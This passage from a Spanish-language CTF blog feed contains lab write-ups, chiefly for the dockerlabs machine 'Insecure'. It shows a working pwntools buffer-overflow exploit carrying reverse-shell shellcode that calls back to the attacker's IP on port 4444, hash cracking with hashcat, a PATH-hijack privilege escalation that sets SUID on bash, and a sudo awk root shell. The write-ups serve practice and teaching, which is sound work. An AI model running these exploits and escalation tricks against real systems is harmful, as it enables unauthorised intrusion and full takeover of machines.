<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>flate@TheHackersLabs-Base:/var/log/apache2<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
</code></pre></div></div>

<p>Vemos qué comandos puede ejecutar <code class="language-plaintext highlighter-rouge">flate</code> como root.</p>

<p>Salida:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/awk
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">flate</code> puede ejecutar <code class="language-plaintext highlighter-rouge">awk</code> como root sin contraseña.</p>

<hr />

<h3 id="14-obtener-shell-root">14: Obtener shell root</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>flate@TheHackersLabs-Base:/var/log/apache2<span class="nv">$ </span><span class="nb">sudo awk</span> <span class="s1">'BEGIN {system("/bin/bash")}'</span>
</code></pre></div></div>

<p>Usamos <code class="language-plaintext highlighter-rouge">awk</code> para ejecutar un shell como root, aprovechando el permiso <code class="language-plaintext highlighter-rouge">NOPASSWD</code>.</p>

<p>Salida:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@TheHackersLabs-Base:/var/log/apache2#
</code></pre></div></div>

<p>¡Ya somos root!</p>

<hr />]]></content><author><name>murrusko</name><email>murrusko@proton.me</email></author><category term="thl" /><category term="ctf" /><category term="linux" /><category term="avanzado" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Insecure</title><link href="/posts/insecure/" rel="alternate" type="text/html" title="Insecure" /><published>2024-09-12T00:00:00+00:00</published><updated>2024-09-12T00:00:00+00:00</updated><id>/posts/insecure</id><content type="html" xml:base="/posts/insecure/"><![CDATA[<p><img src="/assets/images/insecure/0.jpg" alt="image" /></p>

<p>Estamos ante un docker que contiene una distribución Linux. Es de nivel difícil y es de la plataforma <a href="https://dockerlabs.es/">dockerlabs</a>.</p>

<h1 id="enumeración">Enumeración</h1>

<h3 id="escaneo-de-puertos">Escaneo de puertos</h3>

<p>Utilizamos <strong>Rustscan</strong> para identificar rápidamente los puertos abiertos en la IP objetivo:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>rustscan <span class="nt">-a</span> 172.17.0.2 <span class="nt">-b</span> 10
Open 172.17.0.2:80
Open 172.17.0.2:20201
</code></pre></div></div>

<p>Ahora usamos <strong>Nmap</strong> para obtener más información sobre los servicios que corren en los puertos identificados:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p80</span>,20201 <span class="nt">-v</span> 172.17.0.2
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.62 <span class="o">((</span>Debian<span class="o">))</span>
|_http-title: software installation
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.62 <span class="o">(</span>Debian<span class="o">)</span>
20201/tcp open  unknown
| fingerprint-strings: 
|   GenericLines: 
|     Enter data: Data received correctly
|   NULL: 
|_    Enter data:
</code></pre></div></div>

<p>Obtenemos el siguiente resultado:</p>

<ul>
  <li>Puerto 80: Corriendo Apache HTTPD 2.4.62 (Debian). El sitio muestra un título de “software installation”.</li>
  <li>Puerto 20201: Servicio desconocido que acepta entradas con el mensaje “Enter data: Data received correctly”.</li>
</ul>

<h3 id="enumeración-web">Enumeración web</h3>

<p>Exploramos la web con <code class="language-plaintext highlighter-rouge">curl</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-vvvv</span> http://172.17.0.2
...
 &lt;a <span class="nv">style</span><span class="o">=</span><span class="s2">"display: block; width: 100px; margin: 0 auto;"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"./secure_software"</span><span class="o">&gt;</span>download&lt;/a&gt;
....
</code></pre></div></div>

<p>Vemos que hay un enlace para descargar un posible “software”. Lo descargamos y le damos permisos de ejecución:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl http://172.17.0.2/secure_software <span class="nt">-O</span>

<span class="nv">$ </span><span class="nb">chmod</span> +x secure_software
</code></pre></div></div>

<h1 id="intrusión">Intrusión</h1>

<p>Ahora que tenemos el fichero en nuestro equipo vamos a intentar ganar acceso a través del binario. Empezamos abriendo el binario con gdb:</p>

<p><img src="/assets/images/insecure/1.png" alt="image" /></p>

<p>Una vez dentro vamos a crear un patrón por si hubiera un Stack Buffer Overflow. Usamos el comando <code class="language-plaintext highlighter-rouge">pattern create 400</code> :</p>

<p><img src="/assets/images/insecure/2.png" alt="image" /></p>

<p>Ejecutamos el binario dentro de gdb con <code class="language-plaintext highlighter-rouge">run</code>:</p>

<p><img src="/assets/images/insecure/3.png" alt="image" /></p>

<p>En otra consola nos conectamos al binario mediante <strong>telnet</strong> con <code class="language-plaintext highlighter-rouge">telnet localhost 20201</code> y mandamos el patrón que hemos generado anteriormente.</p>

<p>Volvemos a la consola donde se está ejecutando <strong>gdb</strong> y vemos que la aplicación se ha terminado con <strong>SIGSEV.</strong></p>

<p><img src="/assets/images/insecure/4.png" alt="image" /></p>

<p>Ahora tenemos que buscar el offset, el numero de bytes a partir del cual el programa falla. Para ello usamos el comando <code class="language-plaintext highlighter-rouge">pattern offset</code> junto con la dirección de memoria que nos indica:</p>

<p><img src="/assets/images/insecure/5.png" alt="image" /></p>

<p>Ahora que ya sabemos el offset vamos a crearnos un script en python usando la librería  <strong>pwntools</strong> de Python. En este primer script vamos a intentar ver si llena el registro <strong>$eip</strong> con la letra B (“\x42”). Para ello creamos un payload con 300 caracteres A más 4 B’s.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python3</span>

from pwn import <span class="k">*</span>

log.warning<span class="o">(</span>f<span class="s1">'Usage: python3 {sys.argv[0]} [ip:port]'</span><span class="o">)</span>
context.binary <span class="o">=</span> <span class="s1">'secure_software'</span>

payload <span class="o">=</span> <span class="s2">"A"</span><span class="k">*</span>300 + <span class="s2">"B"</span><span class="k">*</span>4

<span class="k">if </span>len<span class="o">(</span>sys.argv<span class="o">)</span> <span class="o">&gt;</span> 1:
    ip, port <span class="o">=</span> sys.argv[1].split<span class="o">(</span><span class="s1">':'</span><span class="o">)</span>
    p <span class="o">=</span> remote<span class="o">(</span>ip, port<span class="o">)</span>
<span class="k">else</span>:
    p <span class="o">=</span> process<span class="o">(</span>context.binary.path<span class="o">)</span>

p.sendlineafter<span class="o">(</span>b<span class="s1">'Enter data: '</span>, payload<span class="o">)</span>
p.interactive<span class="o">()</span>
</code></pre></div></div>

<p>Volvemos a ejecutar el binario en <strong>gdb</strong> y cuando este listo escuchando ejecutamos el script para que se conecte a nuestra máquina desde otra consola:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3 exploit.py 172.17.0.1:20201
<span class="o">[!]</span> Usage: python3 exploit.py <span class="o">[</span>ip:port]
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/mur/machines/dockerlabs/insecure/secure_software'</span>
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
<span class="o">[</span>←] Opening connection to 172.17.0.1 on port 20201: Trying 172.[+] Opening connection to 172.17.0.1 on port 20201: Done
/home/mur/machines/dockerlabs/insecure/exploit.py:16: BytesWarning: Text is not bytes<span class="p">;</span> assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendlineafter<span class="o">(</span>b<span class="s1">'Enter data: '</span>, payload<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
<span class="err">$</span>
</code></pre></div></div>

<p>Vemos que el script se ha ejecutado correctamente. Ahora nos movemos a <strong>gdb</strong> y ejecutamos <code class="language-plaintext highlighter-rouge">register</code> para ver que hay en los registros:</p>

<p><img src="/assets/images/insecure/6.png" alt="image" /></p>

<p>Como vemos se ha sobrescrito el registro <strong>$eip</strong> con el caracter B(\x42)</p>

<p>El siguiente paso es ver como desborda la pila para poder mandar nuestro shellcode y lo ejecute. Le añadimos 100 C’s al final del payload y lo volvemos a ejecutar (hay que reiniciar el binario en gdb)</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python3</span>

from pwn import <span class="k">*</span>

log.warning<span class="o">(</span>f<span class="s1">'Usage: python3 {sys.argv[0]} [ip:port]'</span><span class="o">)</span>
context.binary <span class="o">=</span> <span class="s1">'secure_software'</span>

payload <span class="o">=</span> <span class="s2">"A"</span><span class="k">*</span>300 + <span class="s2">"B"</span><span class="k">*</span>4 + <span class="s2">"C"</span><span class="k">*</span>100 

<span class="k">if </span>len<span class="o">(</span>sys.argv<span class="o">)</span> <span class="o">&gt;</span> 1:
    ip, port <span class="o">=</span> sys.argv[1].split<span class="o">(</span><span class="s1">':'</span><span class="o">)</span>
    p <span class="o">=</span> remote<span class="o">(</span>ip, port<span class="o">)</span>
<span class="k">else</span>:
    p <span class="o">=</span> process<span class="o">(</span>context.binary.path<span class="o">)</span>

p.sendlineafter<span class="o">(</span>b<span class="s1">'Enter data: '</span>, payload<span class="o">)</span>
p.interactive<span class="o">()</span>
</code></pre></div></div>

<p>En <strong>gdb</strong> vamos a ver los siguientes 30bytes después del registro <strong>$esp.</strong> Para ello ejecutamos <code class="language-plaintext highlighter-rouge">x/30x $esp</code>:</p>

<p><img src="/assets/images/insecure/7.png" alt="image" /></p>

<p>Para terminar vamos a meter un shellcode que nos de una reverse shell. Usaremos el siguente shellcode <a href="https://www.exploit-db.com/shellcodes/50125">https://www.exploit-db.com/shellcodes/50125</a> . Como vemos en las notas habría que modificar los bytes para incorporar nuestra dirección IP a partir del byte 26.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">b3</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">d2</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">c6</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">b3</span><span class="se">\x</span><span class="s2">03</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">11</span><span class="se">\x</span><span class="s2">5c</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">10</span><span class="se">\x</span><span class="s2">51</span><span class="se">\x</span><span class="s2">56</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">3f</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">f3</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">fe</span><span class="se">\x</span><span class="s2">c1</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">f9</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">7e</span><span class="se">\x</span><span class="s2">f0</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>

 /<span class="k">*</span> Default IP and port at 26th and 32nd byte index: <span class="se">\x</span>7f<span class="se">\x</span>01<span class="se">\x</span>01<span class="se">\x</span>01 <span class="se">\x</span>11<span class="se">\x</span>5c <span class="k">*</span>/
</code></pre></div></div>

<p>Para convertir nuestra IP a bytes usaremos <code class="language-plaintext highlighter-rouge">python3 -c "import socket; print(socket.inet_aton('172.17.0.1'))"</code> que nos devolverá <strong>b’\xac\x11\x00\x01’ .</strong> La shellcode quedaria asi:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">b3</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">d2</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">c6</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">b3</span><span class="se">\x</span><span class="s2">03</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">ac</span><span class="se">\x</span><span class="s2">11</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">11</span><span class="se">\x</span><span class="s2">5c</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">10</span><span class="se">\x</span><span class="s2">51</span><span class="se">\x</span><span class="s2">56</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">3f</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">f3</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">fe</span><span class="se">\x</span><span class="s2">c1</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">f9</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">7e</span><span class="se">\x</span><span class="s2">f0</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>
</code></pre></div></div>

<p>Modificamos el script para poder incorporar la shellcode:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python3</span>

from pwn import <span class="k">*</span>

log.warning<span class="o">(</span>f<span class="s1">'Usage: python3 {sys.argv[0]} [ip:port]'</span><span class="o">)</span>
context.binary <span class="o">=</span> <span class="s1">'secure_software'</span>

rop <span class="o">=</span> ROP<span class="o">(</span>context.binary<span class="o">)</span>
eip <span class="o">=</span> p32<span class="o">(</span>rop.jmp_esp.address<span class="o">)</span>

reverse <span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">b3</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">d2</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">c6</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">b3</span><span class="se">\x</span><span class="s2">03</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">ac</span><span class="se">\x</span><span class="s2">11</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">11</span><span class="se">\x</span><span class="s2">5c</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">10</span><span class="se">\x</span><span class="s2">51</span><span class="se">\x</span><span class="s2">56</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">3f</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">f3</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">fe</span><span class="se">\x</span><span class="s2">c1</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">f9</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">7e</span><span class="se">\x</span><span class="s2">f0</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>

payload <span class="o">=</span> b<span class="s2">"A"</span><span class="k">*</span>300
payload +<span class="o">=</span> eip
payload +<span class="o">=</span> reverse

<span class="k">if </span>len<span class="o">(</span>sys.argv<span class="o">)</span> <span class="o">&gt;</span> 1:
    ip, port <span class="o">=</span> sys.argv[1].split<span class="o">(</span><span class="s1">':'</span><span class="o">)</span>
    p <span class="o">=</span> remote<span class="o">(</span>ip, port<span class="o">)</span>
<span class="k">else</span>:
    p <span class="o">=</span> process<span class="o">(</span>context.binary.path<span class="o">)</span>

p.sendlineafter<span class="o">(</span>b<span class="s1">'Enter data: '</span>, payload<span class="o">)</span>
p.interactive<span class="o">()</span>
</code></pre></div></div>

<p>Lo probamos en local primero y cuando vemos que funciona lo ejecutamos contra la máquina victima. Nos ponemos a la escucha en nuestra máquina en el puerto 4444, como esta en la shellcode.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-nlvp</span> 4444
Ncat: Version 7.93 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
</code></pre></div></div>

<p>Y ejecutamos el script:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3 exploit.py 172.17.0.2:20201
</code></pre></div></div>

<p>Obtenemos la shell y hacemos el tratamiento de la tty:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Ncat: Connection from 172.17.0.2.
Ncat: Connection from 172.17.0.2:34020.
<span class="nb">whoami
</span>securedev
</code></pre></div></div>

<h1 id="escalada-de-privilegios">Escalada de privilegios</h1>

<h3 id="movimiento-lateral">Movimiento lateral</h3>

<p>Una vez dentro de la máquina vamos a enumerar primero el Home del usuario:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>securedev@6a2ba51ee826:/home/securedev<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
total 20
<span class="nt">-rw-r--r--</span> 1 securedev securedev    68 Sep  6 14:05 hashfile
<span class="nt">-rwxr-xr-x</span> 1 securedev securedev 15264 Sep  6 14:36 secure_software
</code></pre></div></div>

<p>Encontramos un hash:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>securedev@6a2ba51ee826:/home/securedev<span class="nv">$ </span><span class="nb">cat </span>hashfile 
This is <span class="k">for </span>you, john the ripper:

21571b31a8d2e8b03690989835872cc6
</code></pre></div></div>

<p>No tenemos suerte con el rockyou, asi que seguimos buscando por la máquina. Vamos a ver que usuarios hay en el sistema:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>securedev@6a2ba51ee826:/home/securedev<span class="nv">$ </span><span class="nb">cat</span> /etc/passwd | <span class="nb">grep </span>bash
root:x:0:0:root:/root:/bin/bash
securedev:x:1000:1000::/home/securedev:/bin/bash
johntheripper:x:1001:1001::/home/johntheripper:/bin/bash
</code></pre></div></div>

<p>Ahora buscamos ficheros del user <strong>johntheripper:</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>securedev@6a2ba51ee826:/<span class="nv">$ </span>find / <span class="nt">-user</span> johntheripper <span class="nt">-type</span> f 2&gt;/dev/null
/opt/.hidden/words
</code></pre></div></div>

<p>Vemos el contenido del fichero encontrado:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>securedev@6a2ba51ee826:/<span class="nv">$ </span><span class="nb">cat</span> /opt/.hidden/words
I love these words:

test123test333
333300trest
trest00aa20_
_23t_32_g4
testnefg321ttt
trestre2612t33s
11tv1e0st!!!!!
<span class="o">!!</span>10t3bst??
tset0tevst!
ts!tse?test01
_0test!X!test0
0143_t3s5t53_0
</code></pre></div></div>

<p>Nos llevamos a nuestra máquina los ficheros e intentamos sacar la pass con <strong>hashcat</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat <span class="nt">-m</span> 0 <span class="nb">hash </span>words.txt
21571b31a8d2e8b03690989835872cc6:tset0tevst!
</code></pre></div></div>

<p>Nos cambiamos de usuario:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>securedev@6a2ba51ee826:/<span class="nv">$ </span>su johntheripper
Password: 
johntheripper@6a2ba51ee826:~<span class="err">$</span>
</code></pre></div></div>

<p>Hacemos los mismo que con el usuario securedev, listamos el directorio Home y nos encontramos un nuevo binario con permisos SUID de root. Nos lo mandamos a nuestro equipo.</p>

<h3 id="escalada-a-root">Escalada a root</h3>

<p>Lo abrimos con <strong>gdb</strong> y hacemos <strong>disas main</strong> para ver el código en ensamblador:</p>

<p><img src="/assets/images/insecure/8.png" alt="image" /></p>

<p>Podemos ver que hace una llamada a una función <strong>system</strong>.</p>

<p>Ahora abrimos con <strong>ida Free</strong> el binario y vemos que la llamada <strong>system</strong> es ejecutar <strong>ls</strong>.</p>

<p><img src="/assets/images/insecure/9.png" alt="image" /></p>

<p>Vamos a modificar el path para añadir el directorio home del usuario. Ejecutamos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>johntheripper@6a2ba51ee826:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/home/johntheripper/:<span class="nv">$PATH</span>
<span class="nv">PATH</span><span class="o">=</span>/home/johntheripper/:johntheripper@6a2ba51ee826:~<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$PATH</span>
/home/johntheripper/:/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:.
</code></pre></div></div>

<p>Creamos en el directorio home del usuario <strong>johntheripper</strong> un archivo llamado <strong>ls</strong> que ejecute lo siguiente y después le damos permisos de ejecución:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
<span class="nb">chmod</span> +s /usr/bin/bash
</code></pre></div></div>

<p>Ahora ejecutamos el binario <strong>show_files</strong> y después ejecutamos bash -p para obtener la shell de root:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>johntheripper@6a2ba51ee826:~<span class="nv">$ </span>./show_files 
johntheripper@6a2ba51ee826:~<span class="nv">$ </span>bash <span class="nt">-p</span>
bash-5.2# <span class="nb">whoami
</span>root
</code></pre></div></div>]]></content><author><name>murrusko</name><email>murrusko@proton.me</email></author><category term="dockerlabs" /><category term="ctf" /><category term="linux" /><category term="dificil" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">CanYouHackMe?</title><link href="/posts/canyouhackme/" rel="alternate" type="text/html" title="CanYouHackMe?" /><published>2024-09-09T00:00:00+00:00</published><updated>2024-09-09T00:00:00+00:00</updated><id>/posts/canyouhackme</id><content type="html" xml:base="/posts/canyouhackme/"><![CDATA[<p><img src="/assets/images/canyou/canyou.jpg" alt="image" /></p>

<p>En esta ocasión voy a resolver una máquina <strong>Linux</strong> creada por <strong>Enaitz</strong> de dificultad <strong>Principiante</strong> para la plataforma de <a href="https://thehackerslabs.com/">The Hackers Labs</a>.</p>

<h1 id="enumeración">Enumeración</h1>

<h3 id="escaneo-de-red-local">Escaneo de red local</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>arp-scan <span class="nt">-I</span> enp0s3 <span class="nt">--localnet</span>
10.0.2.169      08:00:27:24:af:8e       PCS Systemtechnik GmbH
</code></pre></div></div>

<ul>
  <li><strong><code class="language-plaintext highlighter-rouge">arp-scan</code></strong>: Herramienta que escanea la red local usando el protocolo ARP (Address Resolution Protocol).</li>
